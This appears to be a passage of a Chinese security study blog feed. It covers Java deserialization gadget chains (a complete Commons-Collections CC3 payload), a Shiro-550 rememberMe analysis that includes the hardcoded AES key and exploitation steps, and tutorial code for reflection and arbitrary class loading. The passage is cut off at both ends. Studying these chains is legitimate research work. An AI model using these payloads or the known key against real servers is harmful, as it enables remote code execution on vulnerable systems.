class="line"></span><br></pre></td></tr></table></figure><p>成功</p><p><img src="https://img-blog.csdnimg.cn/c378ae6bb59f4c29959bcba2f7464594.png#pic_center"></p><p>大致思路：</p><p><img src="https://img-blog.csdnimg.cn/ffcd9d7bf6a449349a393b5cb860db84.png#pic_center"></p><p> 这种方法可以用于Runtime被过滤时候使用</p><p>还有<strong>另一种方法</strong>，当我们不想使用InvokeTransform时，我们可以考虑利用下面的这个链子</p><p><img src="https://img-blog.csdnimg.cn/80e78c15d2994c44889f76188740674c.png#pic_center"></p><p>paylaod</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC3 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        Class tc = templates.getClass();</span><br><span class="line">        Field nameField = tc.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        nameField.setAccessible(true);</span><br><span class="line">        nameField.set(templates,&quot;aaa&quot;);</span><br><span class="line">        Field bytecodes  = tc.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        bytecodes.setAccessible(true);</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\text\\class\\text.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line">//        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">//        tfactoryField.setAccessible(true);</span><br><span class="line">//        tfactoryField.set(templates,new TransformerFactoryImpl());</span><br><span class="line">//        templates.newTransformer();</span><br><span class="line"></span><br><span class="line">//        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">//                new ConstantTransformer(templates),</span><br><span class="line">//                new InvokerTransformer(&quot;newTransformer&quot;, null,null)</span><br><span class="line">//        &#125;;</span><br><span class="line"></span><br><span class="line">        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">//        chainedTransformer.transform(1);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line">        InvocationHandler h = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]&#123;Map.class&#125;,h);</span><br><span class="line">        Object o = constructor.newInstance(Override.class,proxy);</span><br><span class="line"></span><br><span class="line">//        serialize(o);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.yongsheng.site/2022/01/30/CommonsCollections-3/">参考</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>shiro550反序列化漏洞分析</title>
      <link href="/2022/06/17/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2022/06/17/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="shiro简介"><a href="#shiro简介" class="headerlink" title="shiro简介"></a>shiro简介</h2><p>Apache Shiro是一种功能强大且易于使用的Java安全框架，它执行身份验证、授权、加密和会话管理，可用于保护任何应用程序的安全。</p><p>Shiro提供了应用程序安全性API来执行以下方面：</p><p>身份验证：证明用户身份，通常称为用户登录</p><p>授权：访问控制</p><p>密码术：保护或隐藏数据以防窥视；</p><p>会话管理：每个用户的时间敏感状态。</p><p>Shiro还支持一些辅助功能，例如Web应用程序安全性，单元测试和多线程支持，它们的存在也是为了加强上述四个方面。</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>当 shiro 版本 &lt;1.2.5时，主要是由shiro 的 rememberMe 内容 反序列化 导致的命令执行漏洞，造成的原因是 AES密钥被硬编码在shiro源码中，这就导致了可以通过在cookie的rememberMe字段插入payload实现任意代码执行</p><p>在我们勾选rememberme登陆后，刷新，抓包，将其 JSESSIONID 删除，使 shiro 验证cookie中rememberme的值是否正确（如果不删除JSESSIONID，shiro则直接以JSESSIONID为登陆凭证了，就不会验证rememberme中的值了）</p><p>简单介绍利用：<br>通过在cookie的rememberMe字段中插入恶意payload，<br>触发shiro框架的rememberMe的反序列化功能，导致任意代码执行。<br>shiro 1.2.24中，提供了硬编码的AES密钥：kPH+bIxk5D2deZiIxcaaaA==<br>由于开发人员未修改AES密钥而直接使用Shiro框架，导致了该问题</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>编辑器：IDEA 2021<br>java版本：jdk8u65<br>Server版本 : Tomcat 8.5.81<br>shiro版本：shiro-root-1.2.4<br><a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">shiro环境搭建</a><br>tomcat官网下载即可</p><h2 id="shiro导入"><a href="#shiro导入" class="headerlink" title="shiro导入"></a>shiro导入</h2><p>下载好以后直接解压<br>然后偷偷的进入samples/web目录，直接修改pom文件，主要修改下面这些</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jstl&lt;/artifactId&gt;</span><br><span class="line">        &lt;!--  这里需要将jstl设置为<span class="number">1.2</span> --&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.2</span>&lt;/version&gt;</span><br><span class="line">        &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">.....</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="tomcat导入"><a href="#tomcat导入" class="headerlink" title="tomcat导入"></a>tomcat导入</h3><p><img src="https://img-blog.csdnimg.cn/156750a0756b447485c57dbdee736246.png"></p><h3 id="war包导入"><a href="#war包导入" class="headerlink" title="war包导入"></a>war包导入</h3><p><img src="https://img-blog.csdnimg.cn/e425712ecc704a33bb2c21483f562568.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="加密方式"><a href="#加密方式" class="headerlink" title="加密方式"></a>加密方式</h3><p>我们要研究的是开启RememberMe后登录的过程，所以从org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin处开始即可，这里是判断是否开启RememberMe然后开始操作的地方<br><img src="https://img-blog.csdnimg.cn/ab003e68b1194cdab5a631a992685e08.png"><br>这里先清除认证信息，然后通过isRememberMe()判断是否有认证信息，也就是是否开启了RememberMe选项框，跟进rememberIdentity()方法<br><img src="https://img-blog.csdnimg.cn/218e474555fd4829a6aa38432e486991.png"><br>首先调用getIdentityToRemember函数来获取用户身份(用户root)，接着跟进rememberIdentity构造方法<br><img src="https://img-blog.csdnimg.cn/020f0e15d8c84698985b62911dccc7b2.png"><br>其实convertPrincipalsToBytes方法将accountPrincipals（也就是用户root)转换为字节形式，我们可以跟进研究一下<br><img src="https://img-blog.csdnimg.cn/ef4dc6a1fe8f40ff9c2b41903ef9b645.png"><br>这里将Principals(用户root)序列话后进行encrypt加密，跟进encrypt函数<br><img src="https://img-blog.csdnimg.cn/a4d182e34b6a46a1afcbf9b26674f9ed.png"><br>具体怎么分析加密，他与解密时一样，这里不在分析<br>加密完成后我们继续返回跟进rememberSerializedIdentity<br><img src="https://img-blog.csdnimg.cn/8f8830585343417088be4c6a7fff7bf5.png"><br>base64编码后，设置到cookie中，其实到这里就是存入的全部流程，序列化—&gt;AES加密—&gt;base64编码—&gt;设置到cookie中的rememberme字段。</p><h3 id="解密方式"><a href="#解密方式" class="headerlink" title="解密方式"></a>解密方式</h3><p>利用账号密码登录，找到getRememberedSerializedIdentity()函数<br>根据该函数名称这个函数是得到反序列化之后的cookie值的函数<br><img src="https://img-blog.csdnimg.cn/dc4ba7241dda4215b2d4b6b632a9e2d8.png"><br>找到调用这个函数的函数getRememberedPrincipals()<br><img src="https://img-blog.csdnimg.cn/b651165dd2ba45bf93b63109d874ee15.png"><br>发现如果byte不为空则进入convertBytesToPrincipals函数，跟进<br><img src="https://img-blog.csdnimg.cn/e89d5b2c3d9b4fb097bcc1472fabc114.png"><br>返现其先解密在进行反序列化<br>跟进解密（这里跟进了几次）<br><img src="https://img-blog.csdnimg.cn/f2a6700ad3884ee2bf2618371478b742.png"><br>发现参数存在密文和key，推测是对称密钥，之后在跟进发现为aes算法，key为固定的密钥<br><img src="https://img-blog.csdnimg.cn/e6a8c93460974aeaa2dcbfdca7b4fb8a.png"><br>跟进序列化发现存在readObject，判断只要存在commons collections拓展，我们就可以利用cc链进行漏洞利用<br><img src="https://img-blog.csdnimg.cn/48c641a4ebd14836b34317d229a20d9e.png"><br>解密的流程到这就结束了，读取cookie中的rememberMe—&gt;base64解码—&gt;AES解密—&gt;反序列化</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>（在实战中一般我们无法较好的利用cc，仅能较好的利用cb）<br>利用就是改rememberMe，我们可以将我们构造的payload进行aes加密在传递，在传递时，一定要将 JSESSIONID删除，具体aes加密就不再演示</p><p>Shiro反序列化漏洞目前为止有两个，Shiro-550(Apache Shiro &lt; 1.2.5)和 Shiro-721( Apache Shiro &lt; 1.4.2 )</p><p>主要区别在于</p><blockquote><p>Shiro550使用已知密钥撞</p><p>Shiro721是使用登录后rememberMe={value}去爆破正确的key值进而反序列化，</p><p>对比Shiro550条件只要有足够密钥库（条件比较低）、Shiro721需要登录（要求比较高鸡肋）</p><p>Apache Shiro &lt; 1.4.2默认使用AES/CBC/PKCS5Padding模式</p><p>Apache Shiro &gt;= 1.4.2默认使用AES/GCM/PKCS5Padding模式</p></blockquote><p><a href="https://www.cnblogs.com/Yang34/p/14122843.html">大佬博客</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化学习（一）</title>
      <link href="/2022/06/07/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0(%E4%B8%80%EF%BC%89/"/>
      <url>/2022/06/07/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0(%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h2><p>反射例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//或取实例化对象</span></span><br><span class="line">        person a = <span class="keyword">new</span> person();</span><br><span class="line">        Class c = a.getClass();</span><br><span class="line">        Constructor personcConstructor = c.getConstructor(String.class,<span class="keyword">int</span>.class);</span><br><span class="line">        <span class="comment">//getConstructor()方法用于返回一个Constructor对象，该对象反映此Class对象表示的类的给定公共构造方法</span></span><br><span class="line">        person p = (person) personcConstructor.newInstance(<span class="string">&quot;abc&quot;</span>,<span class="number">21</span>);</span><br><span class="line">        <span class="comment">// System.out.println(p);</span></span><br><span class="line">        <span class="comment">//或取类中属性</span></span><br><span class="line">        <span class="comment">// Field [] personFields = c.getDeclaredFields();</span></span><br><span class="line">        <span class="comment">// for(Field f:personFields)&#123;</span></span><br><span class="line">        <span class="comment">//     System.out.println(f);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">// Field namefield = c.getField(&quot;name&quot;);</span></span><br><span class="line">        <span class="comment">// namefield.set(p,&quot;xinxin&quot;);</span></span><br><span class="line">        <span class="comment">// System.out.println(p);</span></span><br><span class="line">        <span class="comment">//调用反射里面的方法</span></span><br><span class="line">        <span class="comment">// Method[] personMethods = c.getMethods();</span></span><br><span class="line">        <span class="comment">// for(Method f:personMethods)&#123;</span></span><br><span class="line">        <span class="comment">//     System.out.println(f);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        Method actionmethod = c.getDeclaredMethod(<span class="string">&quot;action&quot;</span>, String.class);</span><br><span class="line">        actionmethod.setAccessible(<span class="keyword">true</span>);<span class="comment">//修改权限</span></span><br><span class="line">        actionmethod.invoke(p,<span class="string">&quot;sssss&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>详细介绍</p><p><a href="https://www.cnblogs.com/yepei/p/5649276.html#:~:text=Class%20%E7%B1%BB%E6%98%AF%E5%9C%A8Java%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%AE%9A%E4%B9%89%E4%B8%80%E4%B8%AA%E7%89%B9%E5%AE%9A%E7%B1%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E3%80%82%20%E4%B8%80%E4%B8%AA%E7%B1%BB%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8C%85%E5%90%AB%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F%EF%BC%8C%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95%EF%BC%8C%E8%BF%98%E6%9C%89%E8%BF%99%E4%B8%AA%E7%B1%BB%E5%AE%9E%E7%8E%B0%E7%9A%84%E6%8E%A5%E5%8F%A3%EF%BC%8C%E4%BB%A5%E5%8F%8A%E8%BF%99%E4%B8%AA%E7%B1%BB%E7%9A%84%E7%88%B6%E7%B1%BB%E3%80%82%20Class%E7%B1%BB%E7%9A%84%E5%AF%B9%E8%B1%A1%E7%94%A8%E4%BA%8E%E8%A1%A8%E7%A4%BA%E5%BD%93%E5%89%8D%E8%BF%90%E8%A1%8C%E7%9A%84%20Java,%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3%E3%80%82%20%E6%AF%94%E5%A6%82%EF%BC%9A%E6%AF%8F%E4%B8%AA%E6%95%B0%E7%BB%84%E5%9D%87%E5%B1%9E%E4%BA%8E%E4%B8%80%E4%B8%AA%20Class%20%E7%B1%BB%E5%AF%B9%E8%B1%A1%EF%BC%8C%E6%89%80%E6%9C%89%E5%85%B7%E6%9C%89%E7%9B%B8%E5%90%8C%E5%85%83%E7%B4%A0%E7%B1%BB%E5%9E%8B%E5%92%8C%E7%BB%B4%E6%95%B0%E7%9A%84%E6%95%B0%E7%BB%84%E5%85%B1%E4%BA%AB%E4%B8%80%E4%B8%AAClass%20%E5%AF%B9%E8%B1%A1%E3%80%82">Class类</a></p><p><a href="https://zhuanlan.zhihu.com/p/86293659">Java 反射机制</a></p><h2 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h2><h4 id="可用形式"><a href="#可用形式" class="headerlink" title="可用形式"></a>可用形式</h4><p>1、入口类的readObject直接调用危险函数</p><p>2、入口类参数中包含可控类，该可控类有危险方法，readObject时调用</p><p>过程：入口A（hashmap）接收参数O（urldns链子）</p><p>​            要利用的类 (URL)</p><p>​            目标调用B.f（f为hashcode）</p><p>​            当A.readObject-&gt;O.f-(由于传入的是URL)&gt;B.f</p><p>​            从而调用“危险”函数（hashcode）</p><p>3、入口参数中包含可控类，该类有调用其他危险方法的类，readObject时调用</p><p>​    <strong>有时在反序列化漏洞中的应用</strong></p><p>​            定制需要的对象</p><p>​            通过invoke调用除了同名函数以外的函数</p><p>​            通过Class类创建对象，引用不能序列化的类</p><p>动态代理不管传递的参数是什么总会调用invoke类</p><p>java命令执行</p><p> Runtime.getRuntime().exec(“calc”)</p><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>在不修改原有类的情况下增加功能。</p><p>在反序列化漏洞的作用：</p><p>readObject-&gt;反序列化自动执行</p><p>invoke-&gt;有函数调用</p><p>主要代码</p><p>test.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="comment">//import java.io.ObjectInputStream.GetField;</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        IUser user= <span class="keyword">new</span> UserImpl();</span><br><span class="line">        <span class="comment">// user.show();</span></span><br><span class="line">        <span class="comment">//静态代理（如果被代理者添加方法，proxy也需要添加，很麻烦！）</span></span><br><span class="line">        <span class="comment">// Userproxy proxy = new Userproxy(user);</span></span><br><span class="line">        <span class="comment">// proxy.show();</span></span><br><span class="line">        <span class="comment">//动态代理</span></span><br><span class="line">        <span class="comment">//要代理的接口，要做的事，calssLader</span></span><br><span class="line">        InvocationHandler useinvocationhandler = <span class="keyword">new</span> Userinvocationhandler(user);</span><br><span class="line">        IUser proxy = (IUser)Proxy.newProxyInstance(user.getClass().getClassLoader(),user.getClass().getInterfaces(),useinvocationhandler);</span><br><span class="line">        proxy.a();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Userinvocationhandler.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Userinvocationhandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span></span>&#123;</span><br><span class="line">    IUser user;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Userinvocationhandler</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Userinvocationhandler</span><span class="params">(IUser user)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.user = user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable</span>&#123;</span><br><span class="line">        method.invoke(user,args);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>意义：少修改代码，适配性强。</p><h2 id="类的加载"><a href="#类的加载" class="headerlink" title="类的加载"></a>类的加载</h2><p>静态代码块和非静态代码块</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">静态</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line">非静态</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相同点：都是JVM加载类时且在构造函数执行之前执行，在类中都可以定义多个，一般在代码块中对一些static变量进行赋值。</p><p>不同点：静态代码块在非静态代码块之前执行（静态代码块 &gt; 非静态代码块）。静态代码块只在第一次new时执行一次，之后不再执行。而非静态代码块每new一次就执行一次</p><p><strong>加载与反序列化</strong></p><p>类加载的时候会执行代码</p><p>初始化：静态代码块</p><p>实例化：构造代码块，无参构造函数</p><p><strong>动态类加载方法</strong></p><p>Class.forname</p><p>初始化/不初始化</p><p>ClassLoader.loadClass不进行初始化</p><p>底层原理，实现加载任意类</p><p>ClassLoader-&gt;SecureClassLoader-&gt;URLClassLoader-&gt;AppClassLoader</p><p>loadClass-&gt;findClass(重写的方法)-&gt;defineClass(从字节码加载类)</p><p>URLClassLoader任意类加载：file/http/jar</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URLClassLoader urlClassloader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;<span class="keyword">new</span> URL(<span class="string">&quot;file:///类的路径&quot;</span>)&#125;);</span><br><span class="line">        Class&lt;?&gt; c = urlClassloader.loadClass(<span class="string">&quot;类名&quot;</span>);</span><br><span class="line">        c.newInstance();</span><br></pre></td></tr></table></figure><p>defineClass同态加载字节码从而加载任意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader cl = ClassLoader.getSystemClassLoader();</span><br><span class="line">        Method m = ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>,String.class, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">        m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\text\\class\\text.class&quot;</span>));</span><br><span class="line">        Class c = (Class)m.invoke(cl,<span class="string">&quot;text&quot;</span>,code,<span class="number">0</span>,code.length);</span><br><span class="line">        c.newInstance();</span><br></pre></td></tr></table></figure><p>java9及以上的版本会出现报错，可在vm option中添加</p><blockquote><p>错误：module java.base does not “opens java.lang” to unnamed module</p><p>–add-opens java.base/java.lang=ALL-UNNAMED</p></blockquote><p>unsafe.defineClass字节码加载public类不能直接生成（需要反射），Spring里面可以直接生成</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这个实例仅适用于Java 8以前的版本。Java 11开始Unsafe类已经把defineClass方法移除了。</span></span><br><span class="line">ClassLoader cl = ClassLoader.getSystemClassLoader();</span><br><span class="line"> <span class="keyword">byte</span>[] code = Files.readAllBytes(Paths.get(<span 